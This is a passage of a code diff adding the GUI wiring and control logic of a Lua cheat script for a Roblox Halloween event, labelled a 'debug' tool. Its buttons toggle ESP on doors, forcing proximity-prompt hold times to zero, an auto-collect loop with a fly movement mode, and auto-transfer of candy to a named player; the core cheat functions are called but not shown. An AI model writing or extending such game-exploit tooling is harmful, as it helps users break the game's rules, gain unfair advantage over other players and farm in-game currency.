+			cleanupDeadESP()
+			for _, door in ipairs(allDoors) do ensureESPForDoor(door) end
+		end
+
+		if State.isPromptActive and not State.isCollectingNow then
+			for _, door in ipairs(allDoors) do
+				for _, p in ipairs(getDoorPrompts(door)) do applyPromptMod(p) end
+			end
+		end
+
+		if State.isAutoCollectActive and not State.isCollectingNow and remainCount > 0 then
+			local char = getAliveCharacter()
+			if char then
+				local ready = (not State.waitForTimerEnabled) or (State.currentRemainingSec <= 0.5)
+				if ready then runCollectionWave() end
+			end
+		end
+	end)
+end)
+table.insert(globalConnections, checkConn)
+
+local function onDescendantAdded(desc)
+	if not desc then return end
+	if desc:IsA("ProximityPrompt") then
+		if originalHoldDurations[desc] == nil then
+			originalHoldDurations[desc] = desc.HoldDuration
+		end
+		if State.isPromptActive and not State.isCollectingNow then
+			task.defer(applyPromptMod, desc)
+		end
+		if State.isEspActive then
+			local root = getDoorRootFromDescendant(desc)
+			if root then task.defer(ensureESPForDoor, root) end
+		end
+	elseif desc.Name == "HalloweenDoor" then
+		if State.isEspActive then
+			task.defer(ensureESPForDoor, desc)
+		end
+	end
+end
+
+local effectsFolder = getEffectsFolder()
+if effectsFolder then
+	local effConn = effectsFolder.DescendantAdded:Connect(onDescendantAdded)
+	table.insert(globalConnections, effConn)
+end
+
+local wsChildConn = Workspace.ChildAdded:Connect(function(child)
+	if not child then return end
+	if child.Name == "Effects" then
+		local effConn = child.DescendantAdded:Connect(onDescendantAdded)
+		table.insert(globalConnections, effConn)
+	elseif child.Name == "HalloweenDoor" or child:IsA("ProximityPrompt") then
+		onDescendantAdded(child)
+	end
+end)
+table.insert(globalConnections, wsChildConn)
+
+-- ==============================================================================
+-- [MODULE 14: BUTTON CLICKS & INTERACTIONS]
+-- ==============================================================================
+local function updateBtnVis(btn, stateVal, labelText)
+	if stateVal then
+		btn.BackgroundColor3 = Color3.fromRGB(20, 50, 30)
+		btn.TextColor3 = Color3.fromRGB(100, 255, 130)
+		btn.Text = labelText .. ": ON"
+	else
+		btn.BackgroundColor3 = Color3.fromRGB(45, 20, 20)
+		btn.TextColor3 = Color3.fromRGB(255, 100, 100)
+		btn.Text = labelText .. ": OFF"
+	end
+end
+
+espBtn.MouseButton1Click:Connect(function()
+	State.isEspActive = not State.isEspActive
+	updateBtnVis(espBtn, State.isEspActive, "ESP")
+	if State.isEspActive then
+		for _, d in ipairs(getActiveDoors()) do ensureESPForDoor(d) end
+	else
+		cleanupDeadESP()
+	end
+end)
+
+promptBtn.MouseButton1Click:Connect(function()
+	State.isPromptActive = not State.isPromptActive
+	updateBtnVis(promptBtn, State.isPromptActive, "PROMPT FIX")
+	if State.isPromptActive then
+		for _, d in ipairs(getActiveDoors()) do
+			for _, p in ipairs(getDoorPrompts(d)) do applyPromptMod(p) end
+		end
+	else
+		for _, conns in pairs(promptConnections) do
+			for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
+		end
+		table.clear(promptConnections)
+	end
+end)
+
+autoCollectBtn.MouseButton1Click:Connect(function()
+	State.isAutoCollectActive = not State.isAutoCollectActive
+	updateBtnVis(autoCollectBtn, State.isAutoCollectActive, "AUTO COLLECT")
+	if not State.isAutoCollectActive then
+		clearRouteBeam()
+		cleanupPhysics()
+		local _, _, hum = getAliveCharacter()
+		if hum then hum.WalkSpeed = State.originalWalkSpeed end
+		safeSetText(statusSubLabel, "Status: Auto-Collect Stopped")
+	else
+		safeSetText(statusSubLabel, string.format("Status: Auto-Collect Started [%s] 🚀", State.movementMode))
+	end
+end)
+
+moveModeBtn.MouseButton1Click:Connect(function()
+	if State.movementMode == "FLY" then
+		State.movementMode = "WALK"
+		moveModeBtn.BackgroundColor3 = Color3.fromRGB(20, 60, 35)
+		moveModeBtn.TextColor3 = Color3.fromRGB(110, 255, 160)
+		moveModeBtn.Text = "MODE: WALK (LEGIT)"
+	else
+		State.movementMode = "FLY"
+		moveModeBtn.BackgroundColor3 = Color3.fromRGB(15, 50, 75)
+		moveModeBtn.TextColor3 = Color3.fromRGB(100, 225, 255)
+		moveModeBtn.Text = "MODE: FLY (120 STUD)"
+	end
+	safeSetText(modeStatusLabel, string.format("Mode: %s | Target: %ds | Raycast: ACTIVE", State.movementMode, State.collectionBudget))
+end)
+
+timerWaitBtn.MouseButton1Click:Connect(function()
+	State.waitForTimerEnabled = not State.waitForTimerEnabled
+	if State.waitForTimerEnabled then
+		timerWaitBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 65)
+		timerWaitBtn.TextColor3 = Color3.fromRGB(220, 160, 255)
+		timerWaitBtn.Text = "TIMER: WAIT 00:00"
+	else
+		timerWaitBtn.BackgroundColor3 = Color3.fromRGB(60, 50, 15)
+		timerWaitBtn.TextColor3 = Color3.fromRGB(255, 220, 90)
+		timerWaitBtn.Text = "TIMER: INSTANT RUN ⚡"
+	end
+end)
+
+budgetInputBox.FocusLost:Connect(function()
+	local val = tonumber(budgetInputBox.Text)
+	if val and val > 0 then
+		State.collectionBudget = val
+		budgetInputBox.Text = tostring(val)
+	else
+		budgetInputBox.Text = tostring(State.collectionBudget)
+	end
+	safeSetText(modeStatusLabel, string.format("Mode: %s | Target: %ds | Raycast: ACTIVE", State.movementMode, State.collectionBudget))
+end)
+
+holdModeBtn.MouseButton1Click:Connect(function()
+	State.useSmartHoldMode = not State.useSmartHoldMode
+	if State.useSmartHoldMode then
+		holdModeBtn.BackgroundColor3 = Color3.fromRGB(25, 40, 65)
+		holdModeBtn.TextColor3 = Color3.fromRGB(130, 200, 255)
+		holdModeBtn.Text = "HOLD: SMART (SAFE)"
+	else
+		holdModeBtn.BackgroundColor3 = Color3.fromRGB(60, 45, 15)
+		holdModeBtn.TextColor3 = Color3.fromRGB(255, 210, 90)
+		holdModeBtn.Text = "HOLD: FORCED 0 SEC"
+	end
+end)
+
+otoTransferBtn.MouseButton1Click:Connect(function()
+	State.isAutoTransferActive = not State.isAutoTransferActive
+	updateBtnVis(otoTransferBtn, State.isAutoTransferActive, "AUTO TRANSFER")
+	if State.isAutoTransferActive then
+		State.targetPlayerName = targetInputBox.Text
+		if State.targetPlayerName == "" then
+			safeSetText(statusSubLabel, "Warning: Enter target username!", Color3.fromRGB(255, 120, 120))
+		else
+			safeSetText(statusSubLabel, "Status: Transfer Active...", Color3.fromRGB(130, 255, 160))
+		end
+	else
+		safeSetText(statusSubLabel, "Status: Transfer Stopped", Color3.fromRGB(140, 140, 155))
+	end
+end)
+
+targetInputBox:GetPropertyChangedSignal("Text"):Connect(function()
+	State.targetPlayerName = targetInputBox.Text
+end)
+
+amountBtn.MouseButton1Click:Connect(function()
+	State.candyAmountIndex = (State.candyAmountIndex % #Config.CANDY_AMOUNTS) + 1
+	State.currentCandyAmount = Config.CANDY_AMOUNTS[State.candyAmountIndex]
+	amountBtn.Text = string.format("DONATE: %s CANDY 🍬", State.currentCandyAmount)
+	safeSetText(candyBalanceLabel, string.format("🍬 Candy: %d | Selected: %s 🍬", State.lastCandyValue, State.currentCandyAmount))
+end)
+
+local isMinimized = false
+minBtn.MouseButton1Click:Connect(function()
+	isMinimized = not isMinimized
+	local elements = {
+		espBtn, promptBtn, autoCollectBtn, moveModeBtn, timerWaitBtn,
+		budgetContainer, holdModeBtn, otoTransferBtn,
+		targetBoxContainer, amountBtn
+	}
+	for _, b in ipairs(elements) do b.Visible = not isMinimized end
+	if isMinimized then
+		timerBox.Position = UDim2.new(0, 6, 0, 25)
+		mainFrame.Size = UDim2.new(0, 218, 0, 114)
+		minBtn.Text = "+"
+	else
+		timerBox.Position = UDim2.new(0, 6, 0, 267)
+		mainFrame.Size = UDim2.new(0, 218, 0, 392)
+		minBtn.Text = "-"
+	end
+end)
+
+local dragging, dragStart, startPos
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true; dragStart = input.Position; startPos = mainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then dragging = false end
+		end)
+	end
+end)
+
+local dragConn = UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+end)
+table.insert(globalConnections, dragConn)
+
+-- ==============================================================================
+-- [MODULE 15: CLEANUP & SHUTDOWN]
+-- ==============================================================================
+_G.HalloweenDoorDebug_Cleanup = function()
+	State.isEspActive = false
+	State.isPromptActive = false
+	State.isAutoCollectActive = false
+	State.isCollectingNow = false
+	State.isAutoTransferActive = false
+
+	clearRouteBeam()
+	cleanupPhysics()
+
+	local _, _, hum = getAliveCharacter()
+	if hum then hum.WalkSpeed = State.originalWalkSpeed end
+
+	cleanupDeadESP()
+
+	for _, conns in pairs(promptConnections) do
+		for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
+	end
+	table.clear(promptConnections)
+
+	for _, c in ipairs(globalConnections) do pcall(function() c:Disconnect() end) end
+	table.clear(globalConnections)
+
+	if screenGui then pcall(function() screenGui:Destroy() end) end
+	_G.HalloweenDoorDebug_Cleanup = nil
+end
+
+print("[DEBUG] Halloween Door Tool v5.8 Loaded Successfully!")
